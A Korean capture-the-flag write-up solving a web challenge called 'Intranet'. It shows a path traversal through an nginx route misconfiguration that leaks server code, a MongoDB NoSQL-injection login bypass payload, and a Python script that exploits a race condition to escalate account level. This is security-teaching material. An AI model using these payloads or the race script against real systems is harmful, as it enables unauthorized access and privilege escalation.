---
title: "2020 사이버작전 경연대회 - Intranet Writeup"
description: "Nginx route 설정 오류와 NoSQL Injection, Race Condition을 이용한 권한 상승"
date: 2020-11-20
tags: ["cyber-warfare", "nosql-injection", "race-condition", "nginx"]
ctf: "사이버작전 경연대회 2020"
published: true
---

<table border="1" style="border-collapse: collapse; width: 69.2432%;" width="1191">
<tbody>
<tr>
<td colspan="2" style="width: 48.6013%;" width="586">
<p><span>문 제</span></p>
</td>
<td style="width: 25.6844%;" width="302">
<p><span>분 야</span></p>
</td>
<td style="width: 25.6844%;" width="302">
<p><span>점 수</span></p>
</td>
</tr>
<tr>
<td colspan="2" style="width: 48.6013%;" width="586">
<p><span>1.</span><span>3<span> </span>Intranet</span></p>
</td>
<td style="width: 25.6844%;" width="302">
<p><span>web</span></p>
</td>
<td style="width: 25.6844%;" width="302">
<p><span>?</span></p>
</td>
</tr>
<tr>
<td colspan="4" style="width: 99.9701%;" width="1191">
<p><span><span><span>노출된</span></span><span><span> </span></span><span><span>적국의</span></span><span><span> </span></span><span><span>생화학</span></span><span><span> </span></span><span><span>연구소</span></span><span><span> </span></span><span><span>내부</span></span><span><span> </span></span><span><span>사이트에서, </span></span><span><span>관리자</span></span><span><span> </span></span><span><span>권한을</span></span><span><span> </span></span><span><span>탈취하여</span></span><span><span> </span></span><span><span>내부</span></span><span><span> </span></span><span><span>시스템을</span></span><span><span> </span></span><span><span>탐색하라.</span></span></span></p>
<p><span><a href="http://3.35.40.133/"><span>http://3.35.40.133</span></a></span></p>
</td>
</tr>
<tr>
<td style="width: 24.3156%;" width="250">
<p><span>풀이 절차</span></p>
</td>
<td colspan="3" style="width: 75.6545%;" width="941">
<ol>
<li><span>nginx route </span><span>설정 오류를 이용한<span> server source code leak</span></span></li>
<li><span>nosql injection</span><span>을 이용한<span> member</span>권한 획득</span></li>
<li><span>기능 확인 후<span> race condition</span>을 이용하여<span> admin </span>권한 획득</span></li>
<li><span>게시판의<span> member level=2 </span>게시글 조회 시 플래그 획득</span></li>
</ol>
</td>
</tr>
<tr>
<td style="width: 24.3156%;" width="250">
<p><span>정 답</span></p>
</td>
<td colspan="3" style="width: 75.6545%;" width="941">
<p><span>flag{This_is_top_secret_dont_you_agree}</span></p>
</td>
</tr>
<tr>
<td colspan="4" style="width: 99.9701%;" width="1191">
<p><span>풀 이 과 정</span></p>
</td>
</tr>
<tr>
<td colspan="4" style="width: 99.9701%;" width="1191"><figure class="imageblock alignCenter" data-filename="image1.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920"><span data-phocus="https://blog.kakaocdn.net/dna/bMfsx8/btqIM7a97AQ/AAAAAAAAAAAAAAAAAAAAAA5nTl-uExM0q4AHI6NWT8HWHaTRNND4sLSvyQB02FBO/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=%2BYLKgsgdaleQGaJAWffBWycS0ys%3D" data-url="https://blog.kakaocdn.net/dna/bMfsx8/btqIM7a97AQ/AAAAAAAAAAAAAAAAAAAAAA5nTl-uExM0q4AHI6NWT8HWHaTRNND4sLSvyQB02FBO/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=%2BYLKgsgdaleQGaJAWffBWycS0ys%3D"><img data-filename="image1.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" src="https://blog.kakaocdn.net/dna/bMfsx8/btqIM7a97AQ/AAAAAAAAAAAAAAAAAAAAAA5nTl-uExM0q4AHI6NWT8HWHaTRNND4sLSvyQB02FBO/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=%2BYLKgsgdaleQGaJAWffBWycS0ys%3D" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FbMfsx8%2FbtqIM7a97AQ%2FAAAAAAAAAAAAAAAAAAAAAA5nTl-uExM0q4AHI6NWT8HWHaTRNND4sLSvyQB02FBO%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1769871599%26allow_ip%3D%26allow_referer%3D%26signature%3D%252BYLKgsgdaleQGaJAWffBWycS0ys%253D"/></span></figure>
<p><span>sign up / sign in </span><span>페이지가 있고</span></p>
<figure class="imageblock alignCenter" data-filename="image2.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920"><span data-phocus="https://blog.kakaocdn.net/dna/bKVnzU/btqIObqSCJD/AAAAAAAAAAAAAAAAAAAAAK-uGgXT-zGxVMe0VJHbzbmACfN4px5Ff4AP9pTxAMmk/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=qbqDABlt7p6xkauX6hKmulrpLkc%3D" data-url="https://blog.kakaocdn.net/dna/bKVnzU/btqIObqSCJD/AAAAAAAAAAAAAAAAAAAAAK-uGgXT-zGxVMe0VJHbzbmACfN4px5Ff4AP9pTxAMmk/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=qbqDABlt7p6xkauX6hKmulrpLkc%3D"><img data-filename="image2.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" src="https://blog.kakaocdn.net/dna/bKVnzU/btqIObqSCJD/AAAAAAAAAAAAAAAAAAAAAK-uGgXT-zGxVMe0VJHbzbmACfN4px5Ff4AP9pTxAMmk/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=qbqDABlt7p6xkauX6hKmulrpLkc%3D" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FbKVnzU%2FbtqIObqSCJD%2FAAAAAAAAAAAAAAAAAAAAAK-uGgXT-zGxVMe0VJHbzbmACfN4px5Ff4AP9pTxAMmk%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1769871599%26allow_ip%3D%26allow_referer%3D%26signature%3DqbqDABlt7p6xkauX6hKmulrpLkc%253D"/></span></figure>
<p><span>회원가입후 로그인하고<span> mypage</span>에 가보면<span> perm</span>이<span> Guest</span>인것을 확인할 수 있다<span>.</span></span></p>
<figure class="imageblock alignCenter" data-filename="image3.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920"><span data-phocus="https://blog.kakaocdn.net/dna/dCuzbq/btqID5yGT0P/AAAAAAAAAAAAAAAAAAAAAJrEc5FV76ggDsKpD4DkrqY80arzdHUSPsHIrFYGd6Pf/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=nio7RzPLJVLvw%2BL%2BSIlwTmg%2F4dA%3D" data-url="https://blog.kakaocdn.net/dna/dCuzbq/btqID5yGT0P/AAAAAAAAAAAAAAAAAAAAAJrEc5FV76ggDsKpD4DkrqY80arzdHUSPsHIrFYGd6Pf/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=nio7RzPLJVLvw%2BL%2BSIlwTmg%2F4dA%3D"><img data-filename="image3.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" src="https://blog.kakaocdn.net/dna/dCuzbq/btqID5yGT0P/AAAAAAAAAAAAAAAAAAAAAJrEc5FV76ggDsKpD4DkrqY80arzdHUSPsHIrFYGd6Pf/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=nio7RzPLJVLvw%2BL%2BSIlwTmg%2F4dA%3D" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FdCuzbq%2FbtqID5yGT0P%2FAAAAAAAAAAAAAAAAAAAAAJrEc5FV76ggDsKpD4DkrqY80arzdHUSPsHIrFYGd6Pf%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1769871599%26allow_ip%3D%26allow_referer%3D%26signature%3Dnio7RzPLJVLvw%252BL%252BSIlwTmg%252F4dA%253D"/></span></figure>
<p><span>이때<span> /api/static/{:userid} </span>를 요청해오는데<span>, </span>이와 서버가<span> nginx</span>임을 미루어 보아 잘못된<span> route</span>설정으로 인하여<span> file leak</span>이 될 수도 있다는것을 가정해볼 수 있다<span>.</span></span></p>
<figure class="imageblock alignCenter" data-filename="image4.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920"><span data-phocus="https://blog.kakaocdn.net/dna/dEgbeN/btqIOaMd53T/AAAAAAAAAAAAAAAAAAAAAIF1VEqfsEn-LLTpe_stjjv_dqnPxOXG-ShPs4w5T42y/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=1k%2B4IDw3cKoxxtM%2Fj7zrDKer%2FaE%3D" data-url="https://blog.kakaocdn.net/dna/dEgbeN/btqIOaMd53T/AAAAAAAAAAAAAAAAAAAAAIF1VEqfsEn-LLTpe_stjjv_dqnPxOXG-ShPs4w5T42y/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=1k%2B4IDw3cKoxxtM%2Fj7zrDKer%2FaE%3D"><img data-filename="image4.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" src="https://blog.kakaocdn.net/dna/dEgbeN/btqIOaMd53T/AAAAAAAAAAAAAAAAAAAAAIF1VEqfsEn-LLTpe_stjjv_dqnPxOXG-ShPs4w5T42y/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=1k%2B4IDw3cKoxxtM%2Fj7zrDKer%2FaE%3D" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FdEgbeN%2FbtqIOaMd53T%2FAAAAAAAAAAAAAAAAAAAAAIF1VEqfsEn-LLTpe_stjjv_dqnPxOXG-ShPs4w5T42y%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1769871599%26allow_ip%3D%26allow_referer%3D%26signature%3D1k%252B4IDw3cKoxxtM%252Fj7zrDKer%252FaE%253D"/></span></figure>
<p><span>이처럼<span> /api/static../User.js </span>를 요청하면<span> nginx</span>에서의 잘못된<span> route</span>설정으로 인하여<span> static</span>디렉터리를 벗어나 본래 접근할 수 없는 파일에 접근하게 되어 서버단 코드를 획득할 수 있다<span>.<br/><br/><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">----</span><br/></span></span></p>
<p><span>const signin = (req, res) =&gt; {</span></p>
<p><span><span>    </span>User</span></p>
<p><span><span>        </span>.findOne({</span></p>
<p><span><span>            </span>userid: req.body.userid,</span></p>
<p><span><span>            </span>password: req.body.password</span></p>
<p><span><span> </span><span>       </span>})</span></p>
<p><span><span>        </span>.then(user =&gt; {</span></p>
<p><span><span>            </span>if (!user) {</span></p>
<p><span><span>                </span>res.status(406);</span></p>
<p><span><span>                </span>res.send();</span></p>
<p><span><span>            </span>} else {</span></p>
<p><span><span>                </span>res.status(200);</span></p>
<p><span><span>                </span>control</span></p>
<p><span><span>                    </span>.sign({ id: user.userid })</span></p>
<p><span><span>           </span><span>         </span>.then(tok =&gt; {</span></p>
<p><span><span>                        </span>res.send(JSON.stringify({</span></p>
<p><span><span>                            </span>username: user.userid,</span></p>
<p><span><span>                            </span>token: tok</span></p>
<p><span><span>                        </span>}))}</span></p>
<p><span><span>                    </span>);</span></p>
<p><span><span>            </span>}})</span></p>
<p><span><span>        </span>.catch(err =&gt; {</span></p>
<p><span><span>            </span>res.status(500);</span></p>
<p><span><span>            </span>res.send(JSON.stringify({ reason: { html: err } }));</span></p>
<p><span><span>        </span>});</span></p>
<p><span>};</span></p>
<p><span><br/><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">----</span><br/><br/></span></p>
<p><span>서버단 코드 중 로그인 부분 코드를 보면<span> mongo db Model</span>의<span> .findOne </span>메서드를 이용하여 사용자로부터 전달받은<span> id</span>와<span> password</span>를<span> key</span>로 검색하는 것을 확인할 수 있다<span>.</span></span></p>
<p><span> </span></p>
<p><span>하지만<span> findOne </span>메서드를 이용하는점<span> + </span>서버의 구성이 <span>app.use( bodyParser.urlencoded({ extended: true }) ); </span>로 이루어져 있기 때문에 사용자는<span> Object </span>객체를 직접 전달할 수 있다<span>. </span>이로 인하여<span> nosql injection</span>이 발생하게 되어</span></p>
<p><span>{"userid":"admin","password":{"$gt":""}} </span><span>와같이 요청하게 되면<span> admin</span>의 패스워드를 모르더라도 로그인이 가능해진다<span>.</span></span></p>
<p><span> </span></p>
<p><span>nosql injection</span><span>을 통해<span> admin</span>의 토큰을 알아냈으니<span> local storage</span>의 토큰값을<span> admin</span>토큰으로 바꾸면 이와같이<span> admin</span>으로 로그인된것을 확인할수있다<span>.</span></span></p>
<p><span> </span></p>
<figure class="imageblock alignCenter" data-filename="image5.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920"><span data-phocus="https://blog.kakaocdn.net/dna/7miPm/btqIz6rDZWo/AAAAAAAAAAAAAAAAAAAAAIf4wnUdRpZd3hLUgCJlWMFrCsj0Q9JHefggcbiUuii-/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=LNbeA41P%2BTmrCk%2BURuW0W0It7Mk%3D" data-url="https://blog.kakaocdn.net/dna/7miPm/btqIz6rDZWo/AAAAAAAAAAAAAAAAAAAAAIf4wnUdRpZd3hLUgCJlWMFrCsj0Q9JHefggcbiUuii-/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=LNbeA41P%2BTmrCk%2BURuW0W0It7Mk%3D"><img data-filename="image5.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" src="https://blog.kakaocdn.net/dna/7miPm/btqIz6rDZWo/AAAAAAAAAAAAAAAAAAAAAIf4wnUdRpZd3hLUgCJlWMFrCsj0Q9JHefggcbiUuii-/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=LNbeA41P%2BTmrCk%2BURuW0W0It7Mk%3D" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2F7miPm%2FbtqIz6rDZWo%2FAAAAAAAAAAAAAAAAAAAAAIf4wnUdRpZd3hLUgCJlWMFrCsj0Q9JHefggcbiUuii-%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1769871599%26allow_ip%3D%26allow_referer%3D%26signature%3DLNbeA41P%252BTmrCk%252BURuW0W0It7Mk%253D"/></span></figure>
<p><span> </span></p>
<p><span>하지만 해당 문제에서 진짜 어드민은<span> level=2 </span>이상이 되어야한다<span>.<br/><br/><br/></span></span></p>
<figure class="imageblock alignCenter" data-filename="image6.png" data-ke-mobilestyle="widthContent" data-origin-height="380" data-origin-width="498"><span data-phocus="https://blog.kakaocdn.net/dna/d7RhVj/btqIz4N7G7T/AAAAAAAAAAAAAAAAAAAAAEE4C-BX3dHQSu2MzJdy-NgZB6hkGpUg5N7FqwK-6tuU/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=%2FRDTSqVhgpiYTAOzQWTDNjXz7vg%3D" data-url="https://blog.kakaocdn.net/dna/d7RhVj/btqIz4N7G7T/AAAAAAAAAAAAAAAAAAAAAEE4C-BX3dHQSu2MzJdy-NgZB6hkGpUg5N7FqwK-6tuU/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=%2FRDTSqVhgpiYTAOzQWTDNjXz7vg%3D"><img data-filename="image6.png" data-ke-mobilestyle="widthContent" data-origin-height="380" data-origin-width="498" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" src="https://blog.kakaocdn.net/dna/d7RhVj/btqIz4N7G7T/AAAAAAAAAAAAAAAAAAAAAEE4C-BX3dHQSu2MzJdy-NgZB6hkGpUg5N7FqwK-6tuU/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=%2FRDTSqVhgpiYTAOzQWTDNjXz7vg%3D" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2Fd7RhVj%2FbtqIz4N7G7T%2FAAAAAAAAAAAAAAAAAAAAAEE4C-BX3dHQSu2MzJdy-NgZB6hkGpUg5N7FqwK-6tuU%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1769871599%26allow_ip%3D%26allow_referer%3D%26signature%3D%252FRDTSqVhgpiYTAOzQWTDNjXz7vg%253D"/></span></figure>
<p><span><br/>현재 접속한 어드민은<span> level=1(member)</span>로써<span> board list</span>에서 조회할 수 있는 게시글은 자신의 레벨보다 낮은 레벨의 게시글만 조회할 수 있다<span>. </span>따라서 문제의 목적에 따라 어드민 레벨을 획득하여야 한다<span>.<br/><br/></span></span></p>
<figure class="imageblock alignCenter" data-filename="image7.png" data-ke-mobilestyle="widthContent" data-origin-height="650" data-origin-width="650"><span data-phocus="https://blog.kakaocdn.net/dna/bdlsVE/btqIObj4yD6/AAAAAAAAAAAAAAAAAAAAAKJKbsR7cFTj1UhFWOknDKDOcK5f_REqeBZOmbM9B3uJ/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=XNR9kqGPm3nvDCYoV3icQ3d8Byc%3D" data-url="https://blog.kakaocdn.net/dna/bdlsVE/btqIObj4yD6/AAAAAAAAAAAAAAAAAAAAAKJKbsR7cFTj1UhFWOknDKDOcK5f_REqeBZOmbM9B3uJ/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=XNR9kqGPm3nvDCYoV3icQ3d8Byc%3D"><img data-filename="image7.png" data-ke-mobilestyle="widthContent" data-origin-height="650" data-origin-width="650" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" src="https://blog.kakaocdn.net/dna/bdlsVE/btqIObj4yD6/AAAAAAAAAAAAAAAAAAAAAKJKbsR7cFTj1UhFWOknDKDOcK5f_REqeBZOmbM9B3uJ/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=XNR9kqGPm3nvDCYoV3icQ3d8Byc%3D" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FbdlsVE%2FbtqIObj4yD6%2FAAAAAAAAAAAAAAAAAAAAAKJKbsR7cFTj1UhFWOknDKDOcK5f_REqeBZOmbM9B3uJ%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1769871599%26allow_ip%3D%26allow_referer%3D%26signature%3DXNR9kqGPm3nvDCYoV3icQ3d8Byc%253D"/></span></figure>
<p> </p>
<p><span>이 상황에서<span> auth </span>동작이 다소 이상하게 되어있는데<span>, </span>만약 올바른<span> division_number</span>를 입력할 시 현재 접속한 계정의<span> level</span>이<span> 0</span>일경우 해당 계정의<span> level</span>를<span> 1 </span>올려주는 동작을 한다<span>.<br/><br/></span></span></p>
<figure class="imageblock alignCenter" data-filename="image8.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920"><span data-phocus="https://blog.kakaocdn.net/dna/b2sMzS/btqIJbkUYpU/AAAAAAAAAAAAAAAAAAAAAB_96b-6ISKq40gVxFKAHvNGP40J38iI-J4pZ0w8THWH/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=oZrCTx2VRZVlaZvSXhaNBNEmx1o%3D" data-url="https://blog.kakaocdn.net/dna/b2sMzS/btqIJbkUYpU/AAAAAAAAAAAAAAAAAAAAAB_96b-6ISKq40gVxFKAHvNGP40J38iI-J4pZ0w8THWH/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=oZrCTx2VRZVlaZvSXhaNBNEmx1o%3D"><img data-filename="image8.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" src="https://blog.kakaocdn.net/dna/b2sMzS/btqIJbkUYpU/AAAAAAAAAAAAAAAAAAAAAB_96b-6ISKq40gVxFKAHvNGP40J38iI-J4pZ0w8THWH/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=oZrCTx2VRZVlaZvSXhaNBNEmx1o%3D" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2Fb2sMzS%2FbtqIJbkUYpU%2FAAAAAAAAAAAAAAAAAAAAAB_96b-6ISKq40gVxFKAHvNGP40J38iI-J4pZ0w8THWH%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1769871599%26allow_ip%3D%26allow_referer%3D%26signature%3DoZrCTx2VRZVlaZvSXhaNBNEmx1o%253D"/></span></figure>
<p> </p>
<p><span>division_number</span><span>는 알려져 있지 않지만 이또한 마찬가지로<span> nosql injection</span>을 통해 레벨을 올릴 수 있다<span>.</span></span></p>
<p><span> </span></p>
<p><span>또한 해당 코드가<span> Division </span>모델에서<span> findOne </span>함수를 이용해 값을 찾고<span> updateOne</span>을 이용해<span> update</span>하는것으로 미루어보아 빠르게 해당 요청을 두번 전송하면<span> race condition</span>이 발생하여<span> level</span>이 두번 증가될 수 있을 가능성을 확인하였다<span>.</span></span></p>
<p><span><br/><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">----</span> <br/><br/></span></p>
<p><span>#-*- coding:utf-8 -*-</span></p>
<p><span>import requests</span></p>
<p><span>import sys</span></p>
<p><span>import time</span></p>
<p><span>import re</span></p>
<p><span>import string</span></p>
<p><span>import datetime</span></p>
<p><span>import json, os, sys, html, zlib</span></p>
<p><span>from arang import *</span></p>
<p><span>from concurrent.futures import ThreadPoolExecutor</span></p>
<p><span>from requests.packages.urllib3.exceptions import InsecureRequestWarning</span></p>
<p><span>requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span></p>
<p><span> </span></p>
<p><span>packet='''POST http://3.35.40.133/api/signup HTTP/1.1</span></p>
<p><span>Host: 3.35.40.133</span></p>
<p><span>Connection: keep-alive</span></p>
<p><span>Content-Length: 42</span></p>
<p><span>Accept: application/json, text/plain, */*</span></p>
<p><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36</span></p>
<p><span>Content-Type: application/json;charset=UTF-8</span></p>
<p><span>Origin: http://3.35.40.133</span></p>
<p><span>Referer: http://3.35.40.133/signup</span></p>
<p><span>Accept-Encoding: gzip, deflate</span></p>
<p><span>Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span></p>
<p><span> </span></p>
<p><span>'''</span></p>
<p><span> </span></p>
<p><span>s = requests.session()</span></p>
<p><span> </span></p>
<p><span>def raceCondition(args):</span></p>
<p><span><span>    </span>global pp,s</span></p>
<p><span><span>    </span>u = 'http://3.35.40.133/api/auth'<span>    </span></span></p>
<p><span><span>    </span>data = {"division_number":{"$gt":""}}</span></p>
<p><span><span>    </span>r = s.post(u, data=json.dumps(data), headers=pp.headers)</span></p>
<p><span><span>    </span>print('--------------')</span></p>
<p><span><span>    </span>print(r.content)</span></p>
<p><span><span>    </span>print('--------------')</span></p>
<p><span> </span></p>
<p><span><span>    </span></span></p>
<p><span> </span></p>
<p><span>for i in range(1,1000):</span></p>
<p><span><span>    </span># signup<span>    </span></span></p>
<p><span><span>    </span>pp = parsePacket(packet.format(i))</span></p>
<p><span><span>    </span>pp.proxies="127.0.0.1:8888"</span></p>
<p><span><span>    </span>data = {"userid":"arat0{:03d}".format(i),"password":"dkfkd31231"}</span></p>
<p><span><span>    </span>r = s.post(pp.url, data=json.dumps(data), headers=pp.headers)</span></p>
<p><span><span>    </span>if r.status_code==200:</span></p>
<p><span><span>        </span># signin</span></p>
<p><span><span>        </span>u = "http://3.35.40.133/api/signin"</span></p>
<p><span><span>        </span>data = {"userid":"arat0{:03d}".format(i),"password":{"$gt":""}}</span></p>
<p><span><span>        </span>r = s.post(u, data=json.dumps(data), headers=pp.headers)</span></p>
<p><span><span>        </span>if r.status_code==200:</span></p>
<p><span><span>            </span>rj = json.loads(r.content)</span></p>
<p><span><span>            </span>pp.headers['x-access-token'] = rj['token']</span></p>
<p><span><span>            </span></span></p>
<p><span><span>            </span></span></p>
<p><span><span>            </span></span></p>
<p><span><span>            </span>with ThreadPoolExecutor(3) as pool:</span></p>
<p><span><span>                </span>t=[1,2,3,4,5]</span></p>
<p><span><span>                </span>ret = [x for x in pool.map(raceCondition,t)]</span></p>
